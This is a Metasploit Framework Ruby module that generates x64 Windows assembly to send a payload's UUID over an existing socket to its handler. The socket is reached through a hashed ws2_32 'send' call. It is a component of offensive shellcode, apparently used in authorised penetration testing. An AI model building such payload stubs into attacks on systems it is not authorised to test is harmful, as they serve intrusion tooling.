# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/uuid'

module Msf

###
#
# Basic send_uuid stub for Windows ARCH_X64 payloads
#
###

module Payload::Windows::SendUUID_x64

  #
  # Generate assembly code that writes the UUID to the socket.
  #
  # This code assumes that the block API pointer is in rbp, and
  # the communications socket handle is in rdi.
  #
  def asm_send_uuid(uuid=nil)
    puts("asm_send_uuid")
    uuid ||= generate_payload_uuid
    uuid_raw = uuid.to_raw

    asm =%Q^
      send_uuid:
        xor r9, r9              ; flags
        push #{uuid_raw.length} ; length of the UUID
        pop r8
        call get_uuid_address  ; put uuid buffer on the stack
        db #{raw_to_db(uuid_raw)}  ; UUID
      get_uuid_address:
        pop rdx                ; UUID address
        mov rcx, rdi           ; Socket handle
        mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
        call rbp               ; call send
    ^

    asm
  end

  def uuid_required_size
    # Start with the number of bytes required for the instructions
    space = 25

    # a UUID is 16 bytes
    space += 16

    space
  end

end

end

